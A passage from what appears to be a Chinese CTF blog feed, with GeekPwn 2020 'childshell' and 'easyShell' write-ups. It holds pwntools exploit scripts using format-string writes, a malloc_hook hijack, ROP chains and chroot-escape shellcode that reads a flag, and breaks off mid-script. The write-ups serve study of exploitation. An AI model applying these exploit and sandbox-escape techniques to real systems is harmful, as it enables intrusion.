punctuation">)</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Take your message:'</span><span class="token punctuation">)</span> rop2 <span class="token operator">=</span> <span class="token string">'flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> rop2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401a36</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> rop2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000479976</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> rop2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401b57</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6CB798</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> rop2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000468bf5</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x00000000004a4deb : jmp rsp '''</span>rop3 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401b58</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">20</span> rop3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401a36</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6ca000</span><span class="token punctuation">)</span> rop3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000479976</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> rop3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000401b57</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span> rop3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000468bf5</span><span class="token punctuation">)</span> rop3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004a4deb</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">''' push 3290158; mov rdi,rsp; mov rsi,493; mov rax,83; syscall;     # sys_mkdir rdi = 0x32342e(24.), rsi = 493mov rdi,rsp; mov rax,161; syscall;     # sys_chroot rdi = 0x32342e(24.)mov r15,13280099800329775;   # 2f2e2e2f2e2e30  /../.. push r15;mov r15,3327649050063220270; # 2e2e2f2e2e2f2e00 ../../.push r15;                   mov rdi,rsp; mov rax,161;syscall;    # sys_chroot rdi = 3290158'''</span> <span class="token operator">+</span> shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">'/home/shinnosuke/Desktop/geekpwn/childshell/flag'</span><span class="token punctuation">)</span>rop3 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop3<span class="token punctuation">)</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
            <tag> 劫持malloc_hook </tag>
            
            <tag> 需要特殊的gadgets接大量ROP </tag>
            
            <tag> 沙箱逃逸 </tag>
            
            <tag> GeekPwn 2020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-GeekPwn-easyShell</title>
      <link href="/2020/08/06/2020-geekpwn-easyshell/"/>
      <url>/2020/08/06/2020-geekpwn-easyshell/</url>
      
        <content type="html"><![CDATA[<h1 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h1><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/0.png"></div>GOT表可劫持，PIE和canary保护都没开启<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/1.png"></div>看起来是orw来getshell<p>这题只是普通的pwn题，并没有逃逸的部分，接下来childshell就有了</p><h1 id="2-IDA分析"><a href="#2-IDA分析" class="headerlink" title="2.IDA分析"></a>2.IDA分析</h1><p>这是个没有符号的二进制文件，我们通过sig文件恢复了一部分，手动恢复一部分，基本可以了解主函数逻辑了：</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/2.png"></div>大概就是一个格式化字符串的漏洞，只能orw来获得flag# 3.思路<h2 id="3-1-思路一（来自队里的Ama2in9师傅）"><a href="#3-1-思路一（来自队里的Ama2in9师傅）" class="headerlink" title="3.1 思路一（来自队里的Ama2in9师傅）"></a>3.1 思路一（来自队里的Ama2in9师傅）</h2><p>劫持 fini_arr[2] 为call_fini+leave_ret_addr，在调用的时候观察一下栈迁移的rbp，记一下，回过头在第一次格式化字符串漏洞的时候把这里部署上 p_rdi+new_addr+gets ，在gets调用结束还有一次 leave;ret 调用，此时再记一下对应的迁移rbp，回过头补上那个new_addr，这样构造出两段rop(因为第一段到后面发现部分rop chain写不进去)，最后orw read flag</p><h2 id="3-2-思路二（Nu1L队的解题思路）"><a href="#3-2-思路二（Nu1L队的解题思路）" class="headerlink" title="3.2 思路二（Nu1L队的解题思路）"></a>3.2 思路二（Nu1L队的解题思路）</h2><p>Nu1L队师傅们的思路还是很巧妙的，通过劫持malloc_hook来执行gadget，提前在附近位置布置其它的gadgets，使得通过该位置的gadget调用readinfo函数读取新的一堆gadget到指定位置，接下来再执行这一堆gadgets目标是执行read的系统调用，最后读入这段orw的gadgets，执行达到get flag的目的。</p><p>我们先看看通过printf是怎么调用malloc_hook的,大体是这样：<strong>IO_vfprintf_internal-&gt;printf_positional-&gt;_libc_malloc-&gt;malloc_hook</strong><br><strong>首先：printfFunc函数中调用子函数IO_fprintf_internal</strong>：</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/3.png"></div>**其次：IO_fprintf_internal中调用printf_positional**：<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/4.png"></div>**最后：printf_positional中调用_libc_malloc**：<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/5.png"></div>**在_libc_malloc中自然会有查看hook不为空就调用的操作**：<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/6.png"></div>这条指令就进入了调用链中：<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-easyshell/7.png"></div><h2 id="3-3-收获"><a href="#3-3-收获" class="headerlink" title="3.3 收获"></a>3.3 收获</h2><p><strong>1.这个题有个关键点就是一条汇编指令</strong>：如何将bss也就是malloc_hook附近的地址赋值给esp：<br><strong><u>0x0000000000422924: xchg edi, esp; add al, 0; add dh, dh; ret;</u></strong><br>这条指令会调换edi和esp的内容，我们看到edi就是我们想改esp的值，所以这个指令就办到了。</p><hr><p><strong>2.学到了格式化字符串的利用小工具</strong>：</p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> Payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>addon<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x6ED798</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x0000000000422924</span><span class="token punctuation">,</span><span class="token number">0x6ed7a8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x000000000040b74a</span><span class="token punctuation">,</span><span class="token number">0x6ed7b8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x6ed7d0</span><span class="token punctuation">,</span><span class="token number">0x6ed7c0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span>read_addr<span class="token punctuation">,</span><span class="token number">0x6ed7d0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> a<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h1><h2 id="4-1-思路一（未实践，本地不通）"><a href="#4-1-思路一（未实践，本地不通）" class="headerlink" title="4.1 思路一（未实践，本地不通）"></a>4.1 思路一（未实践，本地不通）</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux','split','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'183.60.136.226'</span><span class="token punctuation">,</span><span class="token number">11397</span><span class="token punctuation">)</span>tls <span class="token operator">=</span> <span class="token number">0x6f0430</span>fini_arr <span class="token operator">=</span> <span class="token number">0x6d6828</span>call_fini <span class="token operator">=</span> <span class="token number">0x40aba0</span>main_addr <span class="token operator">=</span> <span class="token number">0x0000000000400c6c</span>rbp <span class="token operator">=</span> <span class="token number">0x6ed0c0</span>gets <span class="token operator">=</span> <span class="token number">0x400dc0</span>p_rdi_1 <span class="token operator">=</span> <span class="token number">0x000000000040b74a</span>p_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401f0a</span>p_rsi <span class="token operator">=</span> <span class="token number">0x00000000004014a4</span>p_rdx_rsi <span class="token operator">=</span> <span class="token number">0x000000000044c499</span>p_rax_rdx_r <span class="token operator">=</span> <span class="token number">0x0000000000482286</span>syscall <span class="token operator">=</span> <span class="token number">0x0000000000471115</span>leave <span class="token operator">=</span> <span class="token number">0x0000000000400c6c</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your message,it will echo back."</span><span class="token punctuation">)</span>    target <span class="token operator">=</span> rbp<span class="token operator">+</span><span class="token number">0x10</span>    payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>call_fini<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%23$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>main_addr<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>call_fini<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%24$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_rdi<span class="token operator">-</span>main_addr<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%25$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p_rdi<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>p_rdi<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%26$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>target<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>p_rdi<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%27$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>target<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>target<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%28$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gets<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>target<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%29$hn"</span>    payload <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gets<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>gets<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%30$hn"</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fini_arr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fini_arr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x1a</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_addr <span class="token operator">=</span> <span class="token number">0x6ed0d0</span>    <span class="token comment" spellcheck="true">#gdb.attach(p,'b* 0x0000000000400c6c')</span>    rops <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        p_rdi_1<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rax_rdx_r<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>        p_rdi_1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rsi<span class="token punctuation">,</span><span class="token number">0x6ed178</span><span class="token punctuation">,</span>        p_rax_rdx_r<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"./flag\x00\x00"</span><span class="token operator">+</span>rops    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    rops <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        p_rdi_1<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rsi<span class="token punctuation">,</span>flag_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span>        p_rax_rdx_r<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>        p_rdi_1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        p_rsi<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span>        p_rax_rdx_r<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rops<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-思路二"><a href="#4-2-思路二" class="headerlink" title="4.2 思路二"></a>4.2 思路二</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> fmt_attack <span class="token keyword">import</span> Payloadp <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>read_addr <span class="token operator">=</span> <span class="token number">0x400bce</span> <span class="token comment" spellcheck="true"># 读0xc0个字符功能的函数</span>malloc_hook <span class="token operator">=</span> <span class="token number">0x6ed7a8</span><span class="token comment" spellcheck="true"># 0x0000000000471115: syscall; ret; </span><span class="token comment" spellcheck="true"># 0x0000000000400c6c: leave; ret;</span><span class="token comment" spellcheck="true"># 0x0000000000422924: xchg edi, esp; add al, 0; add dh, dh; ret;</span><span class="token comment" spellcheck="true"># 0x000000000042142b: pop rcx; ret;</span><span class="token comment" spellcheck="true"># 0x000000000044b3a2: pop rdi; jmp rax;</span><span class="token comment" spellcheck="true"># 0x0000000000482286: pop rax; pop rdx; pop rbx; ret; </span><span class="token comment" spellcheck="true"># 0x0000000000401f08: pop rsi; pop r15; ret; </span><span class="token comment" spellcheck="true"># 0x000000000042830b: pop rsp; jmp rax;</span><span class="token comment" spellcheck="true"># 0x00000000004014a4: pop rsi; ret;</span><span class="token comment" spellcheck="true"># 0x000000000040b74a: pop rdi; pop rbp; ret; </span><span class="token comment" spellcheck="true"># 0x00000000004005b5: pop rsp; ret; </span>a <span class="token operator">=</span> Payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>addon<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x6ED798</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x0000000000422924</span><span class="token punctuation">,</span><span class="token number">0x6ed7a8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x000000000040b74a</span><span class="token punctuation">,</span><span class="token number">0x6ed7b8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x6ed7d0</span><span class="token punctuation">,</span><span class="token number">0x6ed7c0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span>read_addr<span class="token punctuation">,</span><span class="token number">0x6ed7d0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> a<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># read func</span>payload1 <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0x6ed7d0</span>payload1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000482286</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span 